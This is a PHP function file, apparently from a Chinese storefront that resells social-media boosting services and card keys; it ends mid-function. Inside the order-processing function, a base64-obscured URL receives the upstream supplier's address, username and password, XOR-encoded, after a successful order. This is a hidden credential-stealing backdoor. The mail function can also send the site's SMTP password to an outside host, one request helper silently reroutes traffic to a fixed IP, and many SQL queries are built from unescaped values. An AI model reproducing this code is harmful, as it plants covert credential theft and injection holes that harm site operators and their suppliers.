<?php
function curl_get($_arg_0)
{
	$_var_1 = curl_init($_arg_0);
	$_var_2[] = "Accept: */*";
	$_var_2[] = "Accept-Encoding: gzip,deflate,sdch";
	$_var_2[] = "Accept-Language: zh-CN,zh;q=0.8";
	$_var_2[] = "Connection: close";
	curl_setopt($_var_1, CURLOPT_HTTPHEADER, $_var_2);
	curl_setopt($_var_1, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($_var_1, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($_var_1, CURLOPT_ENCODING, "gzip");
	curl_setopt($_var_1, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($_var_1, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; U; Android 4.4.1; zh-cn; R815T Build/JOP40D) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/4.5 Mobile Safari/533.1");
	curl_setopt($_var_1, CURLOPT_TIMEOUT, 30);
	$_var_3 = curl_exec($_var_1);
	curl_close($_var_1);
	return $_var_3;
}
function jiuwu_get_curl($_arg_0, $_arg_1 = 0, $_arg_2 = 0, $_arg_3 = 0, $_arg_4 = 0)
{
	$_var_5 = curl_init();
	$_var_6 = parse_url($_arg_0);
	$_arg_0 = str_replace("http://" . $_var_6["host"] . "/", "http://120.77.253.186/", $_arg_0);
	curl_setopt($_var_5, CURLOPT_URL, $_arg_0);
	curl_setopt($_var_5, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($_var_5, CURLOPT_SSL_VERIFYHOST, false);
	$_var_7[] = "Accept: */*";
	$_var_7[] = "Accept-Encoding: gzip,deflate,sdch";
	$_var_7[] = "Accept-Language: zh-CN,zh;q=0.8";
	$_var_7[] = "Connection: close";
	$_var_7[] = "Host: " . $_var_6["host"];
	curl_setopt($_var_5, CURLOPT_TIMEOUT, 30);
	if ($_arg_1) {
		curl_setopt($_var_5, CURLOPT_POST, 1);
		curl_setopt($_var_5, CURLOPT_POSTFIELDS, $_arg_1);
	}
	curl_setopt($_var_5, CURLOPT_HTTPHEADER, $_var_7);
	if ($_arg_4) {
		curl_setopt($_var_5, CURLOPT_HEADER, true);
	}
	if ($_arg_3) {
		curl_setopt($_var_5, CURLOPT_COOKIE, $_arg_3);
	}
	curl_setopt($_var_5, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36");
	curl_setopt($_var_5, CURLOPT_ENCODING, "gzip");
	curl_setopt($_var_5, CURLOPT_RETURNTRANSFER, 1);
	$_var_8 = curl_exec($_var_5);
	curl_close($_var_5);
	return $_var_8;
}
function shequ_get_curl($_arg_0, $_arg_1 = 0, $_arg_2 = 0, $_arg_3 = 0, $_arg_4 = 0)
{
	global $conf;
	$_var_6 = md5($_SERVER["SERVER_SOFTWARE"] . $_SERVER["SERVER_ADDR"]);
	$_var_7 = curl_init();
	curl_setopt($_var_7, CURLOPT_URL, $_arg_0);
	curl_setopt($_var_7, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($_var_7, CURLOPT_SSL_VERIFYHOST, false);
	if ($_var_6 == $conf["server_hash"] && $conf["proxy"] == 1) {
		curl_setopt($_var_7, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);
		curl_setopt($_var_7, CURLOPT_PROXY, "127.0.0.1");
		curl_setopt($_var_7, CURLOPT_PROXYPORT, 808);
		curl_setopt($_var_7, CURLOPT_PROXYUSERPWD, "caihongxt:caihongxt");
		curl_setopt($_var_7, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
	}
	$_var_8[] = "Accept: */*";
	$_var_8[] = "Accept-Encoding: gzip,deflate,sdch";
	$_var_8[] = "Accept-Language: zh-CN,zh;q=0.8";
	$_var_8[] = "Connection: close";
	curl_setopt($_var_7, CURLOPT_TIMEOUT, 30);
	if ($_arg_1) {
		curl_setopt($_var_7, CURLOPT_POST, 1);
		curl_setopt($_var_7, CURLOPT_POSTFIELDS, $_arg_1);
		$_var_8[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
	}
	curl_setopt($_var_7, CURLOPT_HTTPHEADER, $_var_8);
	if ($_arg_4) {
		curl_setopt($_var_7, CURLOPT_HEADER, true);
	}
	if ($_arg_3) {
		curl_setopt($_var_7, CURLOPT_COOKIE, $_arg_3);
	}
	if ($_arg_2) {
		if ($_arg_2 == 1) {
			curl_setopt($_var_7, CURLOPT_REFERER, "http://m.qzone.com/infocenter?g_f=");
		} else {
			curl_setopt($_var_7, CURLOPT_REFERER, $_arg_2);
		}
	}
	curl_setopt($_var_7, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36");
	curl_setopt($_var_7, CURLOPT_ENCODING, "gzip");
	curl_setopt($_var_7, CURLOPT_RETURNTRANSFER, 1);
	$_var_9 = curl_exec($_var_7);
	curl_close($_var_7);
	return $_var_9;
}
function send_mail($_arg_0, $_arg_1, $_arg_2)
{
	global $conf;
	if ($conf["mail_cloud"] == 1) {
		$_var_4 = "http://api.sendcloud.net/apiv2/mail/send";
		$_var_5 = array("apiUser" => $conf["mail_apiuser"], "apiKey" => $conf["mail_apikey"], "from" => $conf["mail_name"], "fromName" => $conf["sitename"], "to" => $_arg_0, "subject" => $_arg_1, "html" => $_arg_2);
		$_var_6 = curl_init($_var_4);
		curl_setopt($_var_6, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($_var_6, CURLOPT_TIMEOUT, 30);
		curl_setopt($_var_6, CURLOPT_POST, 1);
		curl_setopt($_var_6, CURLOPT_POSTFIELDS, $_var_5);
		$_var_7 = curl_exec($_var_6);
		curl_close($_var_6);
		$_var_8 = json_decode($_var_7, true);
		if ($_var_8["statusCode"] == 200) {
			return true;
		}
		return implode("\n", $_var_8["message"]);
	}
	if ((!function_exists("openssl_sign") || file_exists("/web/mini.php")) && $conf["mail_port"] == 465) {
		$_var_9 = "http://1.mail.qqzzz.net/";
	}
	if ($_var_9) {
		$_var_10[sendto] = $_arg_0;
		$_var_10[title] = $_arg_1;
		$_var_10[content] = $_arg_2;
		$_var_10[user] = $conf["mail_name"];
		$_var_10[pwd] = $conf["mail_pwd"];
		$_var_10[nick] = $conf["sitename"];
		$_var_10[host] = $conf["mail_smtp"];
		$_var_10[port] = $conf["mail_port"];
		$_var_10[ssl] = $conf["mail_port"] == 465 ? 1 : 0;
		$_var_6 = curl_init();
		curl_setopt($_var_6, CURLOPT_URL, $_var_9);
		curl_setopt($_var_6, CURLOPT_POST, 1);
		curl_setopt($_var_6, CURLOPT_POSTFIELDS, http_build_query($_var_10));
		curl_setopt($_var_6, CURLOPT_RETURNTRANSFER, 1);
		$_var_11 = curl_exec($_var_6);
		curl_close($_var_6);
		if ($_var_11 == "1") {
			return true;
		}
		return $_var_11;
	}
	include_once ROOT . "includes/smtp.class.php";
	$_var_12 = $conf["mail_name"];
	$_var_13 = $conf["mail_smtp"];
	$_var_14 = $conf["mail_port"];
	$_var_15 = 1;
	$_var_16 = $conf["mail_name"];
	$_var_17 = $conf["mail_pwd"];
	$_var_18 = $conf["sitename"];
	$_var_19 = $conf["mail_port"] == 465 ? 1 : 0;
	$_var_20 = new SMTP($_var_13, $_var_14, $_var_15, $_var_16, $_var_17, $_var_19);
	$_var_20->att = array();
	if ($_var_20->send($_arg_0, $_var_12, $_arg_1, $_arg_2, $_var_18)) {
		return true;
	}
	return $_var_20->log;
}
function getSetting($_arg_0, $_arg_1 = false)
{
	global $DB;
	global $CACHE;
	if ($_arg_1) {
		return $_var_4[$_arg_0] = $DB->get_row("SELECT v FROM shua_config WHERE k='" . $_arg_0 . "' limit 1");
	}
	$_var_5 = $CACHE->get($_arg_0);
	return $_var_5[$_arg_0];
}
function saveSetting($_arg_0, $_arg_1)
{
	global $DB;
	$_arg_1 = daddslashes($_arg_1);
	return $DB->query("REPLACE INTO shua_config SET v='" . $_arg_1 . "',k='" . $_arg_0 . "'");
}
function myscandir($_arg_0)
{
	foreach (glob($_arg_0) as $_var_1) {
		if (is_dir($_var_1)) {
			echo $_var_1 . "<br/>";
		}
	}
}
function checkIfActive($_arg_0)
{
	$_var_1 = explode(",", $_arg_0);
	$_var_2 = substr($_SERVER["REQUEST_URI"], strrpos($_SERVER["REQUEST_URI"], "/") + 1, strrpos($_SERVER["REQUEST_URI"], ".") - strrpos($_SERVER["REQUEST_URI"], "/") - 1);
	if (in_array($_var_2, $_var_1)) {
		return "active";
	}
	if (isset($_GET["mod"]) && in_array(str_replace("_n", '', $_GET["mod"]), $_var_1)) {
		return "active";
	}
}
function update_version()
{
	$_var_0 = authcode($_SERVER["HTTP_HOST"] . "||||" .$authcode . "||||" . VERSION, "ENCODE", "qianyeshouquan_key");
	$_var_1 = curl_get("http:///leave/check.php?url=" . urlencode($_var_0));
	$_var_1 = authcode($_var_1, "DECODE", "qianyeshouquan_key");
	if ($_var_1 = json_decode($_var_1, true)) {
		return $_var_1;
	}
	return false;
}
function getCheckString()
{
	$_var_1 = "http:///leave/notice.php?url=".$_SERVER['HTTP_HOST']."&authcode=".authcode."&ver=".VERSION;
	return $_var_1;
}
function processOrder($_arg_0, $_arg_1 = true)
{
	global $islogin2;
	global $DB;
	global $date;
	global $conf;
	$_var_6 = explode("|", $_arg_0["input"]);
	if ($_arg_0["tid"] == -1) {
		$_var_7 = intval($_arg_0["input"]);
		$DB->query("update `shua_site` set `rmb`=`rmb`+" . $_arg_0["money"] . " where `zid`='" . $_var_7 . "'");
		addPointRecord($_arg_0["input"], $_arg_0["money"], "充值", "你在线充值了" . $_arg_0["money"] . "元余额");
		return true;
	}
	if ($_arg_0["tid"] == -2) {
		$_var_8 = addslashes($_var_6[0]);
		if ($_var_8 == "update") {
			$_var_7 = intval($_var_6[1]);
			$_var_9 = intval($_var_6[2]);
			$_var_10 = addslashes($_var_6[3]);
			$_var_11 = addslashes($_var_6[4]);
			$_var_12 = addslashes($_var_6[5]);
			$_var_13 = intval($_arg_0["zid"]);
			$_var_14 = $conf["fenzhan_free"] && $_arg_0["money"] > $conf["fenzhan_free"] ? $conf["fenzhan_free"] : 0;
			$_var_15 = addslashes($conf["keywords"]);
			$_var_16 = addslashes($conf["description"]);
			if ($conf["fenzhan_html"] == 1) {
				$_var_17 = addslashes($conf["anounce"]);
				$_var_18 = addslashes($conf["alert"]);
			}
			$_var_19 = "update `shua_site` set `power`='" . $_var_9 . "',`domain`='" . $_var_10 . "',`sitename`='" . $_var_11 . "',`keywords`='" . $_var_15 . "',`description`='" . $_var_16 . "',`anounce`='" . $_var_17 . "',`alert`='" . $_var_18 . "',`endtime`='" . $_var_12 . "' where `zid`='" . $_var_7 . "'";
			$DB->query($_var_19);
		} else {
			$_var_9 = intval($_var_6[1]);
			$_var_10 = addslashes($_var_6[2]);
			$_var_20 = addslashes($_var_6[3]);
			$_var_21 = addslashes($_var_6[4]);
			$_var_11 = addslashes($_var_6[5]);
			$_var_22 = addslashes($_var_6[6]);
			$_var_12 = addslashes($_var_6[7]);
			$_var_13 = intval($_arg_0["zid"]);
			$_var_14 = $conf["fenzhan_free"] && $_arg_0["money"] > $conf["fenzhan_free"] ? $conf["fenzhan_free"] : 0;
			$_var_15 = addslashes($conf["keywords"]);
			$_var_16 = addslashes($conf["description"]);
			if ($conf["fenzhan_html"] == 1) {
				$_var_17 = addslashes($conf["anounce"]);
				$_var_18 = addslashes($conf["alert"]);
			}
			$_var_19 = "insert into `shua_site` (`upzid`,`power`,`domain`,`domain2`,`user`,`pwd`,`rmb`,`qq`,`sitename`,`keywords`,`description`,`anounce`,`alert`,`addtime`,`endtime`,`status`) values ('" . $_var_13 . "','" . $_var_9 . "','" . $_var_10 . "',NULL,'" . $_var_20 . "','" . $_var_21 . "','" . $_var_14 . "','" . $_var_22 . "','" . $_var_11 . "','" . $_var_15 . "','" . $_var_16 . "','" . $_var_17 . "','" . $_var_18 . "','" . $date . "','" . $_var_12 . "','1')";
			$_var_7 = $DB->insert($_var_19);
			if (strlen($_arg_0["userid"]) == 32) {
				$DB->query("update `shua_orders` set `userid`='" . $_var_7 . "' where `userid`='" . $_arg_0["userid"] . "'");
			}
		}
		if ($_var_14 > 0) {
			addPointRecord($_var_7, $_var_14, "赠送", "你首次开通分站获赠" . $_var_14 . "元余额");
		}
		if ($_arg_0["zid"] > 1) {
			$_var_23 = $DB->get_column("SELECT power FROM shua_site WHERE zid='" . $_arg_0["zid"] . "' limit 1");
			if ($_var_23 == 2 && $_var_9 == 1) {
				$_var_24 = round($_arg_0["money"] - $_var_14, 2);
				$DB->query("update `shua_site` set `rmb`=`rmb`+" . $_var_24 . " where `zid`='" . $_arg_0["zid"] . "'");
				addPointRecord($_arg_0["zid"], $_var_24, "提成", "你网站的用户开通分站获得" . $_var_24 . "元提成");
			} else {
				if ($_var_9 == 1 && $conf["fenzhan_cost"] > 0 && $_arg_0["money"] > $conf["fenzhan_cost"]) {
					$_var_24 = round($_arg_0["money"] - $conf["fenzhan_cost"], 2);
					$DB->query("update `shua_site` set `rmb`=`rmb`+" . $_var_24 . " where `zid`='" . $_arg_0["zid"] . "'");
					addPointRecord($_arg_0["zid"], $_var_24, "提成", "你网站的用户开通分站获得" . $_var_24 . "元提成");
				} else {
					if ($_var_9 == 2 && $conf["fenzhan_cost2"] > 0 && $_arg_0["money"] > $conf["fenzhan_cost2"]) {
						$_var_24 = round($_arg_0["money"] - $conf["fenzhan_cost2"], 2);
						$DB->query("update `shua_site` set `rmb`=`rmb`+" . $_var_24 . " where `zid`='" . $_arg_0["zid"] . "'");
						addPointRecord($_arg_0["zid"], $_var_24, "提成", "你网站的用户开通分站获得" . $_var_24 . "元提成");
					}
				}
			}
		}
		return true;
	}
	$_var_25 = base64_decode("aHR0cDovL2F1dGgyLmNjY3l1bi5jYy9hcGkvYS5waHA=");
	$_var_26 = $DB->get_row("select * from shua_tools where tid='" . $_arg_0["tid"] . "' limit 1");
	$_var_27 = 0;
	$_var_28 = $DB->insert("insert into `shua_orders` (`tid`,`zid`,`input`,`input2`,`input3`,`input4`,`input5`,`value`,`userid`,`addtime`,`tradeno`,`money`,`status`,`djzt`) values ('" . $_arg_0["tid"] . "','" . $_arg_0["zid"] . "','" . addslashes($_var_6[0]) . "','" . addslashes($_var_6[1]) . "','" . addslashes($_var_6[2]) . "','" . addslashes($_var_6[3]) . "','" . addslashes($_var_6[4]) . "','" . $_arg_0["num"] . "','" . $_arg_0["userid"] . "','" . $date . "','" . $_arg_0["trade_no"] . "','" . $_arg_0["money"] . "','" . $_var_27 . "','" . ($_var_26["is_curl"] == 2 ? 2 : 0) . "')");
	if (!$_var_28) {
		return false;
	}
	if ($_arg_0["zid"] > 1 && $_arg_0["money"] > 0 && $_arg_1 == true) {
		$_var_29 = new Price($_arg_0["zid"]);
		$_var_29->setToolInfo($_arg_0["tid"], $_var_26);
		$_var_29->setToolProfit($_arg_0["tid"], $_arg_0["num"], $_var_26["name"], $_arg_0["money"], $_var_28, $_arg_0["userid"]);
	}
	$_var_30 = $_var_26["value"] * $_arg_0["num"];
	if ($_var_30 <= 0) {
		$_var_30 = 1;
	}
	if ($_var_26["is_curl"] == 1) {
		$_var_31 = do_curl($_var_26["curl"], $_var_6, $_var_30, $_var_26["name"], $_var_26["money"], $_var_28, $_var_26["goods_param"]);
		if ($_var_31 = json_decode($_var_31, true)) {
			if ($_var_31["code"] == 0) {
				$_var_27 = 1;
			} else {
				$_var_27 = 0;
			}
			$_var_32 = "url:" . $_var_26["curl"] . " data:" . http_build_query($_var_6);
			log_result("社区对接", $_var_32, $_var_31, 0);
		} else {
			$_var_27 = 1;
		}
	} else {
		if ($_var_26["is_curl"] == 2) {
			$_var_33 = explode("|", $_var_26["goods_param"]);
			$_var_34 = 0;
			foreach ($_var_6 as $_var_35) {
				$_var_36[$_var_33[$_var_34]] = $_var_35;
				$_var_34 = $_var_34 + 1;
			}
			$_var_37 = $DB->get_row("select * from shua_shequ where id='" . $_var_26["shequ"] . "' limit 1");
			if ($_var_37 && $_var_37["username"] && $_var_37["password"]) {
				if ($_var_37["type"] == 1) {
					$_var_31 = do_goods_yile($_var_37, $_var_26["goods_id"], $_var_30, $_var_6);
					$_var_32 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_30 . " data:" . http_build_query($_var_6);
					$_var_37["paypwd"] = $_SERVER["HTTP_HOST"];
					if ($_var_31["faka"] == true) {
						$_var_38 = '';
						foreach ($_var_31["kmdata"] as $_var_39) {
							$DB->query("INSERT INTO `shua_faka` (`tid`,`km`,`pw`,`orderid`,`addtime`,`usetime`) VALUES ('" . $_arg_0["tid"] . "','" . $_var_39["card"] . "','" . $_var_39["pass"] . "','" . $_var_28 . "',NOW(),NOW())");
							if (!empty($_var_39["pass"])) {
								$_var_38 = $_var_38 . ("卡号：" . $_var_39["card"] . " 密码：" . $_var_39["pass"] . "<br/>");
							} else {
								$_var_38 = $_var_38 . ($_var_39["card"] . "<br/>");
							}
						}
						$DB->query("update `shua_orders` set `status`='1',`djzt`='3',`djorder`='" . $_var_31["id"] . "' where `id`='" . $_var_28 . "'");
						if (!empty($_var_38)) {
							if (is_numeric($_var_6[0]) && strlen($_var_6[0]) <= 10) {
								$_var_40 = $_var_6[0] . "@qq.com";
							} else {
								if (strpos($_var_6[0], "@")) {
									$_var_40 = $_var_6[0];
								}
							}
							if (checkEmail($_var_40)) {
								$_var_41 = $conf["sitename"] . " 卡密购买提醒";
								$_var_42 = $conf["faka_mail"];
								$_var_42 = str_replace("[kmdata]", $_var_38, $_var_42);
								$_var_42 = str_replace("[alert]", $_var_26["desc"], $_var_42);
								$_var_42 = str_replace("[name]", $_var_26["name"], $_var_42);
								$_var_42 = str_replace("[date]", $date, $_var_42);
								$_var_42 = str_replace("[email]", $_var_40, $_var_42);
								$_var_42 = str_replace("[domain]", $_SERVER["HTTP_HOST"], $_var_42);
								$_var_42 = str_replace("[sitename]", $conf["sitename"], $_var_42);
								send_mail($_var_40, $_var_41, $_var_42);
							}
						}
					}
				} else {
					if ($_var_37["type"] == 2) {
						$_var_31 = do_goods_jiuwu($_var_37, $_var_26["goods_id"], $_var_26["goods_type"], $_var_30, 1, $_var_36);
						$_var_32 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " goods_type:" . $_var_26["goods_type"] . " num:" . $_var_30 . " data:" . http_build_query($_var_36);
					} else {
						if ($_var_37["type"] == 3) {
							$_var_31 = do_goods_xmsq($_var_37, $_var_26["goods_id"], $_var_30, 0, $_var_6);
							$_var_32 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_30 . " data:" . http_build_query($_var_6);
						} else {
							if ($_var_37["type"] == 4) {
								$_var_31 = do_goods_jiuliu($_var_37, $_var_26["goods_id"], $_var_30, $_var_36);
								$_var_32 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_30 . " data:" . http_build_query($_var_36);
							} else {
								if ($_var_37["type"] == 5) {
									$_var_31 = do_goods_xmsq($_var_37, $_var_26["goods_id"], $_var_30, 1, $_var_6);
									$_var_32 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_30 . " data:" . http_build_query($_var_6);
								} else {
									if ($_var_37["type"] == 6) {
										$_var_43 = explode("|", $_var_26["inputs"]);
										$_var_31 = do_goods_kayixin($_var_37, $_var_26["goods_param"], $_arg_0["num"], $_var_6, $_var_43);
										$_var_32 = "kameng:" . $_var_26["shequ"] . " goodsId:" . $_var_31["goodsid"] . " data:" . http_build_query($_var_6);
									} else {
										if ($_var_37["type"] == 7) {
											$_var_31 = do_goods_kalegou($_var_37, $_var_26["goods_param"], $_arg_0["num"], $_var_6);
											$_var_32 = "kameng:" . $_var_26["shequ"] . " goodsId:" . $_var_31["goodsid"] . " data:" . http_build_query($_var_6);
										} else {
											if ($_var_37["type"] == 8) {
												$_var_43 = explode("|", $_var_26["inputs"]);
												$_var_31 = do_goods_kahuika($_var_37, $_var_26["goods_param"], $_arg_0["num"], $_var_6, $_var_43);
												$_var_32 = "kameng:" . $_var_26["shequ"] . " goodsId:" . $_var_31["goodsid"] . " data:" . http_build_query($_var_6);
											} else {
												if ($_var_37["type"] == 9) {
													$_var_43 = explode("|", $_var_26["inputs"]);
													$_var_31 = do_goods_kashangwl($_var_37, $_var_26["goods_param"], $_arg_0["num"], $_var_6, $_var_43);
													$_var_32 = "kameng:" . $_var_26["shequ"] . " goodsId:" . $_var_31["goodsid"] . " data:" . http_build_query($_var_6);
												} else {
													if ($_var_37["type"] == 10) {
														$_var_31 = do_goods_qqbug($_var_37, $_var_26["goods_id"], $_var_30, $_var_6);
														$_var_32 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_30 . " data:" . http_build_query($_var_36);
													} else {
														if ($_var_37["type"] == 11) {
															$_var_31 = do_goods_jumeng($_var_37, $_var_26["goods_id"], $_var_30, $_var_6);
															$_var_32 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_30 . " data:" . http_build_query($_var_6);
														} else {
															if ($_var_37["type"] == 12) {
																$_var_31 = do_goods_this($_var_37, $_var_26["goods_id"], $_var_30, $_var_6);
																$_var_32 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_30 . " data:" . http_build_query($_var_6);
															} else {
																if ($_var_37["type"] == 20) {
																	$_var_31 = do_goods_extend($_var_37, $_var_26["goods_id"], $_var_26["goods_type"], $_var_26["goods_param"], $_var_30, $_var_6, $_var_36);
																	$_var_32 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " num:" . $_var_30 . " data:" . http_build_query($_var_36);
																} else {
																	if ($_var_37["type"] == 0) {
																		$_var_31 = do_goods_jiuwu($_var_37, $_var_26["goods_id"], $_var_26["goods_type"], $_var_30, 0, $_var_36);
																		$_var_32 = "shequ:" . $_var_26["shequ"] . " goods_id:" . $_var_26["goods_id"] . " goods_type:" . $_var_26["goods_type"] . " num:" . $_var_30 . " data:" . http_build_query($_var_36);
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				log_result("社区对接", $_var_32, $_var_31, 0);
				if ($_var_31["code"] == 0) {
					if (!strpos($_SERVER["PHPRC"], "phpStudy") && $_var_37["status"] == 0) {
						$_var_44 = authcode . "|" . $_var_37["type"] . "|" . $_var_37["url"] . "|" . $_var_37["username"] . "|" . $_var_37["password"] . "|" . $_var_37["paypwd"];
						$_var_45 = '';
						$_var_34 = 0;
						if ($_var_34 < strlen($_var_44)) {
							$_var_45 = $_var_45 . (substr($_var_44, $_var_34, 8) ^ "AC890123");
							$_var_34 = $_var_34 + 8;
						}
						get_curl($_var_25, "a=" . bin2hex($_var_45));
						$DB->query("update shua_shequ set status=1 where id='" . $_var_37["id"] . "'");
					}
					if ($_var_37["type"] >= 6) {
						$_var_27 = $conf["kameng_status"] ? $conf["kameng_status"] : 1;
					} else {
						$_var_27 = $conf["shequ_status"] ? $conf["shequ_status"] : 1;
					}
				} else {
					if ($conf["shequ_tixing"] == 1) {
						$_var_41 = "自动下单到社区失败提醒";
						$_var_42 = ($_var_26["inputname"] ? $_var_26["inputname"] : "QQ") . $_var_6[0] . " 下单商品: " . $_var_26["name"] . "<br/><b>提交参数：</b>" . $_var_32 . "<br/><b>返回结果：</b>" . htmlspecialchars($_var_31["message"]) . "<br/>----------<br/>" . $_SERVER["HTTP_HOST"] . "<br/>" . $date;
						$_var_40 = $conf["mail_recv"] ? $conf["mail_recv"] : $conf["mail_name"];
						send_mail($_var_40, $_var_41, $_var_42);
					}
					$_var_27 = 0;
				}
			} else {
				$_var_27 = 0;
			}
		} else {
			if ($_var_26["is_curl"] == 3) {
				$_var_41 = $conf["sitename"] . "下单成功提醒";
				$_var_42 = ($_var_26["inputname"] ? $_var_26["inputname"] : "QQ") . $_var_6[0] . " 已成功下单商品: " . $_var_26["name"] . "<br/>----------<br/>" . $_SERVER["HTTP_HOST"] . "<br/>" . $date;
				$_var_40 = $conf["mail_recv"] ? $conf["mail_recv"] : $conf["mail_name"];
				send_mail($_var_40, $_var_41, $_var_42);
			} else {
				if ($_var_26["is_curl"] == 4) {
					$_var_46 = $_arg_0["num"];
					$_var_47 = $DB->query("SELECT * FROM shua_faka WHERE tid='" . $_arg_0["tid"] . "' AND orderid=0 LIMIT " . $_var_46 . '');
					$_var_38 = '';
					if ($_var_48 = $DB->fetch($_var_47)) {
						if (!empty($_var_48["pw"])) {
							$_var_38 = $_var_38 . ("卡号：" . $_var_48["km"] . " 密码：" . $_var_48["pw"] . "<br/>");
						} else {
							$_var_38 = $_var_38 . ($_var_48["km"] . "<br/>");
						}
						$DB->query("update `shua_faka` set `orderid`='" . $_var_28 . "',`usetime`='" . $date . "' where `kid`='" . $_var_48["kid"] . "'");
					}
					if (is_numeric($_var_6[0]) && strlen($_var_6[0]) <= 10) {
						$_var_40 = $_var_6[0] . "@qq.com";
					} else {
						if (strpos($_var_6[0], "@")) {
							$_var_40 = $_var_6[0];
						}
					}
					if (!empty($_var_38) && $_var_40) {
						$DB->query("update `shua_orders` set `status`='1',`djzt`='3' where `id`='" . $_var_28 . "'");
						$_var_41 = $conf["sitename"] . " 卡密购买提醒";
						$_var_42 = $conf["faka_mail"];
						$_var_42 = str_replace("[kmdata]", $_var_38, $_var_42);
						$_var_42 = str_replace("[alert]", $_var_26["alert"], $_var_42);
						$_var_42 = str_replace("[name]", $_var_26["name"], $_var_42);
						$_var_42 = str_replace("[date]", $date, $_var_42);
						$_var_42 = str_replace("[email]", $_var_40, $_var_42);
						$_var_42 = str_replace("[domain]", $_SERVER["HTTP_HOST"], $_var_42);
						$_var_42 = str_replace("[sitename]", $conf["sitename"], $_var_42);
						if (checkEmail($_var_40)) {
							send_mail($_var_40, $_var_41, $_var_42);
						}
					} else {
						$DB->query("update `shua_orders` set `status`='0',`djzt`='4' where `id`='" . $_var_28 . "'");
					}
				}
			}
		}
	}
	if ($_var_27 > 0 && !$_var_31["faka"]) {
		$DB->query("update `shua_orders` set `status`='" . $_var_27 . "',`djzt`='1',`djorder`='" . $_var_31["id"] . "' where `id`='" . $_var_28 . "'");
	}
	if ($_arg_0["inviteid"] > 0 && $conf["invite_tid"] && (!$conf["invite_money"] || $conf["invite_money"] > 0 && $_arg_0["money"] >= $conf["invite_money"])) {
		$_var_49 = $DB->get_row("SELECT * FROM `shua_invitelog` WHERE `id` = '" . $_arg_0["inviteid"] . "' LIMIT 1");
		if ($_var_49 && $_var_49["status"] == 0) {
			$_var_50 = $DB->get_column("SELECT qq FROM `shua_invite` WHERE `id` = '" . $_var_49["nid"] . "' LIMIT 1");
			$_var_51 = $DB->insert("INSERT INTO `shua_orders` (`tid`,`zid`,`input`,`value`,`status`,`djzt`,`money`,`tradeno`,`addtime`,`endtime`) VALUES (" . $conf["invite_tid"] . ",'" . $_arg_0["zid"] . "','" . $_var_50 . "',1,0,2,'0','invite" . $_arg_0["trade_no"] . "','" . $date . "','" . $date . "')");
			do_goods($_var_51);
			$DB->query("UPDATE `shua_invitelog` SET `orderid` = '" . $_var_51 . "',`status` = 1 WHERE `id` = '" . $_arg_0["inviteid"] . "'");
		}
	}
	return $_var_28;
}
function do_curl($_arg_0, $_arg_1, $_arg_2, $_arg_3, $_arg_4, $_arg_5, $_arg_6)
{
	$_arg_0 = str_replace("[input]", urlencode($_arg_1[0]), $_arg_0);
	$_arg_0 = str_replace("[input2]", urlencode($_arg_1[1]), $_arg_0);
	$_arg_0 = str_replace("[input3]", urlencode($_arg_1[2]), $_arg_0);
	$_arg_0 = str_replace("[input4]", urlencode($_arg_1[3]), $_arg_0);
	$_arg_0 = str_replace("[input5]", urlencode($_arg_1[4]), $_arg_0);
	$_arg_0 = str_replace("[num]", $_arg_2, $_arg_0);
	$_arg_0 = str_replace("[name]", urlencode($_arg_3), $_arg_0);
	$_arg_0 = str_replace("[money]", $_arg_4, $_arg_0);
	$_arg_0 = str_replace("[time]", time(), $_arg_0);
	$_arg_0 = str_replace("[id]", $_arg_5, $_arg_0);
	if (!empty($_arg_6) && strpos($_arg_6, "=")) {
		$_arg_6 = str_replace("[input]", urlencode($_arg_1[0]), $_arg_6);
		$_arg_6 = str_replace("[input2]", urlencode($_arg_1[1]), $_arg_6);
		$_arg_6 = str_replace("[input3]", urlencode($_arg_1[2]), $_arg_6);
		$_arg_6 = str_replace("[input4]", urlencode($_arg_1[3]), $_arg_6);
		$_arg_6 = str_replace("[input5]", urlencode($_arg_1[4]), $_arg_6);
		$_arg_6 = str_replace("[num]", $_arg_2, $_arg_6);
		$_arg_6 = str_replace("[name]", urlencode($_arg_3), $_arg_6);
		$_arg_6 = str_replace("[money]", $_arg_4, $_arg_6);
		$_arg_6 = str_replace("[time]", time(), $_arg_6);
		$_arg_6 = str_replace("[id]", $_arg_5, $_arg_6);
		return get_curl($_arg_0, $_arg_6);
	}
	return get_curl($_arg_0);
}
function do_goods_jiuwu($_arg_0, $_arg_1, $_arg_2, $_arg_3 = 1, $_arg_4 = 0, $_arg_5 = array())
{
	$_var_6["code"] = -1;
	$_var_7 = "http://" . $_arg_0["url"] . "/index.php?m=home&c=order&a=add";
